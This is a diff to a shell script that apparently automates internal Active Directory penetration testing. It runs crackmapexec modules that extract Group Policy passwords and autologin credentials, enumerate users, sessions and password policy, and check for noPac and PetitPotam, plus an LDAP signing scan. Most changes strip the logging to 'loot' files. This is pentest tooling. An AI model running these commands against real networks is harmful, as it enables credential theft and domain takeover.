@@ -58,7 +58,7 @@ echo $HASH
 echo $DOM
 echo $IP
 
-exit 0
+#exit 0
 
 shift "$((OPTIND - 1))"
 [ "$1" = "--" ] && shift
@@ -83,10 +83,10 @@ if [ -z $HASH ]
 then
  # Use Password
  # GPP password
-    crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M gpp_password | tee -a /root/output/loot/intern/ad/gpp_password/$IP_pass.txt
-
+    crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M gpp_password
+exit 0
  # GPP autologin
-    crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M gpp_autologin | tee -a /root/output/loot/intern/ad/gpp_autologin/$IP_login.txt
+    crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M gpp_autologin
 
  # User txt from DC
     crackmapexec smb $IP -u $USER -p $PASS -d $DOM --users > /root/output/list/raw.txt
@@ -97,16 +97,16 @@ then
  # keep the raw file for screens and debugging
 
  # Password policy
-    crackmapexec smb $IP -u $USER -p $PASS -d $DOM --pass-pol | tee -a /root/output/loot/intern/ad/passpol/$DOM_pol.txt
+    crackmapexec smb $IP -u $USER -p $PASS -d $DOM --pass-pol
 
  # nopac
-    crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M nopac | tee -a /root/output/loot/intern/ldap/nopac/$IP.txt
+    crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M nopac
 
  # petitpotam
-    crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M petitpotam | tee -a /root/output/loot/intern/rpc/petit_potam
+    crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M petitpotam
 
  # sessions
-    crackmapexec smb $IP -u $USER -p $PASS -d $DOM --sessions | tee -a /root/output/loot/intern/ad/session/$IP_sessions.txt
+    crackmapexec smb $IP -u $USER -p $PASS -d $DOM --sessions
 
  # ldap signing 
     python3 /opt/LdapRelayScan/LdapRelayScan.py -u $USER -p $PASS -dc-ip $IP -method BOTH > /root/output/loot/intern/ldap/signing/signig.txt
